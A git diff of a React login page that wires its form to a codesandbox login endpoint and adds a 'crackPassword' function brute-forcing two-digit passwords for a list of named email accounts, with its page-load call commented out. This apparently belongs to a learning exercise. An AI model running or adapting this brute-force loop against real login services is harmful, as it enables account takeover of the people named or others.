@@ -1,18 +1,67 @@
 import { useFormik } from 'formik';
-import React from 'react';
+import React, { useEffect } from 'react';
 import { object, string } from 'yup';
 import { TextField, Button, Box } from '@material-ui/core';
+import styled from 'styled-components';
+import { useHistory } from 'react-router-dom';
 
-const MyButton = (props) => <button {...props} />;
+async function crackPassword() {
+  const logins = [
+    // 'egordavidovich@mail.com',
+    // 'feliksharauski@mail.com',
+    // 'viktorg@mail.com',
+    // 'dtarankevich@mail.com',
+    // 'tataiana@mail.com',
+    'taisiagvozdeva@mail.com',
+    // 'mariaguk@mail.com',
+    // 'alexsavich@mail.com',
+    // 'ysekach@mail.com',
+  ];
+
+  logins.forEach(login => {
+    [...Array(100)].forEach((_, i) => {
+      fetch('https://uoxfu.sse.codesandbox.io/login', {
+        method: 'POST',
+        body: JSON.stringify({
+          login,
+          password: `${i < 10 ? 0 : ''}${i}`,
+        }),
+        headers: {
+          // Accept: 'application/json',
+          'Content-Type': 'application/json',
+        },
+      }).then(res => {
+        if (res.status === 200) console.log(`${i < 10 ? 0 : ''}${i}`);
+      });
+    });
+  });
+}
+
+const LoginPageWrapper = styled(Box)`
+  background-color: aqua;
+`;
+
+const MyButton = props => <button {...props} />;
 
 export default function LoginPage({ sting, ...otherProps }) {
+  const { push } = useHistory();
   const formik = useFormik({
     initialValues: {
       login: '',
       password: '',
     },
-    onSubmit: (values) => {
-      alert(JSON.stringify(values, null, 2));
+    onSubmit: values => {
+      fetch('https://uoxfu.sse.codesandbox.io/login', {
+        method: 'POST',
+        body: JSON.stringify(values),
+        headers: {
+          // Accept: 'application/json',
+          'Content-Type': 'application/json',
+        },
+      }).then(res => {
+        if (res.status === 200) push('/');
+      });
+      // alert(JSON.stringify(values, null, 2));
       formik.resetForm();
     },
     validateOnChange: false,
@@ -22,10 +71,13 @@ export default function LoginPage({ sting, ...otherProps }) {
       password: string().required(),
     }),
   });
-
+  // useEffect(() => {
+  //   crackPassword();
+  // }, []);
   return (
-    <Box
+    <LoginPageWrapper
       m={2}
+      className="class1"
       style={{
         height: '100vh',
         width: '100vw',
@@ -64,6 +116,6 @@ export default function LoginPage({ sting, ...otherProps }) {
           <MyButton login={formik.values.login} />
         </div>
       </form>
-    </Box>
+    </LoginPageWrapper>
   );
 }
